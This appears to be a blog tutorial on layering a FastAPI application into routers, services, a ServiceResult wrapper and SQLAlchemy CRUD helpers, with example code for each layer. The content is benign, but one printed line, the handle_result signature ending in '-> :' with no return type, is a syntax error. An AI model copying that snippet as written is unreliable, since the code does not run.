<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community – it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> – Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller → service → data access) and returning responses (bottom up: data access → service → controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> — Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service – grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer – Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> fastapi </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> FastAPI</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> routers </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> foo</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">app </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FastAPI()</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">@app.exception_handler</span><span data-v-3d5c50e8="">(AppExceptionCase)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">custom_app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> e</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">await</span><span data-v-3d5c50e8=""> app_exception_handler(request, e)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">app.include_router(foo.router)</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routers and their routes are defined in modules within the <code data-v-3d5c50e8="">routers</code> package. Each route instantiates the respective service and passes on the database session from the request dependency. Handled by <code data-v-3d5c50e8="">handle_result()</code>, the service result (either the requested data as the result of a successful operation, or an exception) is returned. In case of an exception, instead of (and before) returning any response, the app exception handler in <code data-v-3d5c50e8="">main</code> picks up handling the exception and returns a response.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">router </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> APIRouter(</span><span data-v-3d5c50e8="">prefix</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">"/foo"</span><span data-v-3d5c50e8="">)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">@router.post</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">@router.get</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/</span><span data-v-3d5c50e8="">{item_id}</span><span data-v-3d5c50e8="">"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span></code></pre></div>
<h2 id="service-result-class--success--exceptions" data-v-3d5c50e8="">Service Result Class – Success &amp; Exceptions</h2>
<p data-v-3d5c50e8="">The <code data-v-3d5c50e8="">ServiceResult</code> class defines a generic outcome of a service operation. In case the operation is successful, the outcome (or "value") is returned contained within the value attribute of the instance. In case of a custom app exception, the service result instance contains information about the raised exception (e.g., which status code should be returned to the client).</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">service_result.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> arg</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">isinstance</span><span data-v-3d5c50e8="">(arg, AppExceptionCase):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">False</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.exception_case</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">else</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"[Success]"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">'[Exception] "</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"'</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__repr__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"&lt;ServiceResult Success&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">19</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;ServiceResult AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">20</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__enter__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">21</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">22</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__exit__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">*</span><span data-v-3d5c50e8="">kwargs</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">23</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">pass</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">24</span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">handle_result</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">result</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">) -&gt; :</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">25</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> result.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">26</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> exception:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">27</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">raise</span><span data-v-3d5c50e8=""> exception</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">28</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> result:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">29</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> result</span></span></code></pre></div>
<h2 id="service-layer--business-logic" data-v-3d5c50e8="">Service Layer – Business Logic</h2>
<p data-v-3d5c50e8="">Services are defined in the <code data-v-3d5c50e8="">services</code> package. Each service is a subclass of <code data-v-3d5c50e8="">AppService</code>. The database session is passed down from the request dependency via an "interface-like" mixin utility class (other mixing classes may be added via multiple inheritance in order to extend available attributes).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> DBSessionMixin</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Session</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> db</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppService(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppCRUD(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routes belonging to service <code data-v-3d5c50e8="">Foo</code> are connected to methods of <code data-v-3d5c50e8="">FooService</code>, which encapsulates all business logic of the service. The return value are of type <code data-v-3d5c50e8="">ServiceResult</code>: Containing a value attribute with returnable data or, in case of an exception, an <code data-v-3d5c50e8="">AppException</code>. In both cases, the respective result is returned back "upwards" to the controller layer.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooService(AppService)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooCreateItem())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooCRUD(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooGetItem({</span><span data-v-3d5c50e8="">"item_id"</span><span data-v-3d5c50e8="">: item_id}))</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> foo_item.public:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(AppException.FooItemRequiresAuth())</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> ServiceResult(foo_item)</span></span></code></pre></div>
<h2 id="data-access-layer--database-operations" data-v-3d5c50e8="">Data Access Layer – Database Operations</h2>
<p data-v-3d5c50e8="">CRUD helper methods perform operations on the database and are subclassing <code data-v-3d5c50e8="">AppCRUD</code>. The database session is passed down from the <code data-v-3d5c50e8="">AppService</code> instance. These methods are atomic and only concerned with operating on the database. They do not contain any business logic.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooCRUD(AppCRUD)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooItem(</span><span data-v-3d5c50e8="">description</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.description, </span><span data-v-3d5c50e8="">public</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">item.public)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.add(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.commit()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.refresh(foo_item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">) -&gt; FooItem:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">        foo_item </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db.query(FooItem).filter(FooItem.id </span><span data-v-3d5c50e8="">==</span><span data-v-3d5c50e8=""> item_id).first()</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> foo_item:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> foo_item</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span></code></pre></div>
<p data-v-3d5c50e8="">Pydantic "schemas" or models are defined in the <code data-v-3d5c50e8="">schemas</code> package. They contain mainly two different kinds of data models. First, those expected from clients as request data (route parameters in route method definitions). Second, those expected to be returned to clients as response data (defined in response_model parameter of route definitions).</p>
<p data-v-3d5c50e8="">Additionally, it's possible to model any kind of data being passed inbetween the layers of the app (controller, service and data-access).</p>
